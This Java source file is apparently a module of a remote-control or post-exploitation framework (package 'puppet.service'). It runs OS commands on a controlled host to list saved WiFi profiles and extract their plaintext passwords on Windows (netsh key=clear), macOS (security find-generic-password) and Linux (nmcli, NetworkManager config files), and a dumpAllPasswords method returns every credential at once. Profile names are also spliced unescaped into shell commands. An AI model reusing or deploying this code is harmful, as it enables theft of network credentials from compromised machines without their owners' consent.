package org.leo.core.puppet.service;

import org.leo.core.net.Communication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * WiFi 配置文件与密码提取服务（服务器端解析版）。
 * 自动适配 Windows / macOS / Linux。
 */
public class WifiProfileService extends ComponentService {

    public WifiProfileService(Communication communication,
                              List<RequestLayer> requestLayers,
                              List<ResponseLayer> responseLayers) {
        super(communication, requestLayers, responseLayers);
    }

    public Map<String, Object> listProfiles() throws Exception {
        String osOutput = execFast("uname -s 2>/dev/null || echo Windows");
        boolean isWindows = isWindows(osOutput);
        boolean isMac = !isWindows && osOutput.toLowerCase().contains("darwin");

        List<Map<String, Object>> profiles = new ArrayList<>();

        if (isWindows) {
            String out = execFast("cmd /c \"chcp 65001 > nul & netsh wlan show profiles\"");
            for (String line : lines(out)) {
                if (line.contains(":") && (line.contains("Profile") || line.contains("配置文件"))) {
                    String name = afterColon(line);
                    if (!name.isEmpty()) {
                        Map<String, Object> p = new HashMap<>();
                        p.put("name", name);
                        profiles.add(p);
                    }
                }
            }
        } else if (isMac) {
            String out = execFast("/usr/sbin/networksetup -listpreferredwirelessnetworks en0 2>/dev/null");
            String[] lineArr = lines(out);
            for (int i = 1; i < lineArr.length; i++) {
                String name = lineArr[i].trim();
                if (!name.isEmpty()) {
                    Map<String, Object> p = new HashMap<>();
                    p.put("name", name);
                    profiles.add(p);
                }
            }
        } else {
            String out = execFast("nmcli -t -f NAME,TYPE connection show 2>/dev/null | grep wifi");
            if (out != null && !out.trim().isEmpty()) {
                for (String line : lines(out)) {
                    String name = line.split(":")[0].trim();
                    if (!name.isEmpty()) {
                        Map<String, Object> p = new HashMap<>();
                        p.put("name", name);
                        profiles.add(p);
                    }
                }
            }
            if (profiles.isEmpty()) {
                out = execFast("ls /etc/NetworkManager/system-connections/ 2>/dev/null");
                for (String line : lines(out)) {
                    String name = line.trim().replace(".nmconnection", "");
                    if (!name.isEmpty()) {
                        Map<String, Object> p = new HashMap<>();
                        p.put("name", name);
                        profiles.add(p);
                    }
                }
            }
        }

        Map<String, Object> result = new HashMap<>();
        result.put("code", 200);
        result.put("os", isWindows ? "windows" : isMac ? "macos" : "linux");
        result.put("total", profiles.size());
        result.put("profiles", profiles);
        return result;
    }

    public Map<String, Object> profileDetail(String profileName) throws Exception {
        String osOutput = execFast("uname -s 2>/dev/null || echo Windows");
        boolean isWindows = isWindows(osOutput);
        boolean isMac = !isWindows && osOutput.toLowerCase().contains("darwin");

        Map<String, Object> data = new HashMap<>();
        data.put("profile", profileName);

        if (isWindows) {
            String out = execFast("cmd /c \"chcp 65001 > nul & netsh wlan show profile name=\"\"" + profileName + "\"\" key=clear\"");
            data.put("raw", truncate(out, 4096));
            for (String line : lines(out)) {
                if ((line.contains("Key Content") || line.contains("关键内容")) && line.contains(":")) {
                    data.put("password", afterColon(line));
                }
                if (line.contains("Authentication") && line.contains(":")) {
                    data.put("auth", afterColon(line));
                }
            }
        } else if (isMac) {
            String pw = execFast("security find-generic-password -wa \"" + profileName + "\" 2>/dev/null");
            data.put("password", pw != null && !pw.trim().isEmpty() ? pw.trim() : "(access denied or not found)");
        } else {
            String pw = execFast("nmcli -s -g 802-11-wireless-security.psk connection show \"" + profileName + "\" 2>/dev/null");
            if (pw != null && !pw.trim().isEmpty()) {
                data.put("password", pw.trim());
                data.put("source", "nmcli");
            } else {
                String raw = execFast(
                        "cat \"/etc/NetworkManager/system-connections/" + profileName + "\" 2>/dev/null || " +
                        "cat \"/etc/NetworkManager/system-connections/" + profileName + ".nmconnection\" 2>/dev/null");
                if (raw != null && !raw.trim().isEmpty()) {
                    data.put("source", "config-file");
                    for (String line : lines(raw)) {
                        if (line.trim().startsWith("psk=")) {
                            data.put("password", line.trim().substring(4));
                        }
                    }
                }
            }
        }

        Map<String, Object> result = new HashMap<>();
        result.put("code", 200);
        result.put("data", data);
        return result;
    }

    public Map<String, Object> dumpAllPasswords() throws Exception {
        Map<String, Object> listResult = listProfiles();
        @SuppressWarnings("unchecked")
        List<Map<String, Object>> profiles = (List<Map<String, Object>>) listResult.get("profiles");

        List<Map<String, Object>> creds = new ArrayList<>();
        for (Map<String, Object> p : profiles) {
            String name = (String) p.get("name");
            try {
                Map<String, Object> detail = profileDetail(name);
                @SuppressWarnings("unchecked")
                Map<String, Object> data = (Map<String, Object>) detail.get("data");
                creds.add(data != null ? data : p);
            } catch (Exception e) {
                Map<String, Object> err = new HashMap<>();
                err.put("profile", name);
                err.put("error", e.getMessage());
                creds.add(err);
            }
        }

        Map<String, Object> result = new HashMap<>();
        result.put("code", 200);
        result.put("total", creds.size());
        result.put("credentials", creds);
        return result;
    }

    // ── 辅助方法 ─────────────────────────────────────────────────────────────

    private boolean isWindows(String osOutput) {
        return osOutput == null || osOutput.trim().isEmpty() || osOutput.toLowerCase().contains("windows");
    }

    private String[] lines(String s) {
        if (s == null || s.isEmpty()) return new String[0];
        return s.split("\n");
    }

    private String afterColon(String line) {
        int idx = line.indexOf(':');
        return idx >= 0 ? line.substring(idx + 1).trim() : "";
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "...(truncated)";
    }
}
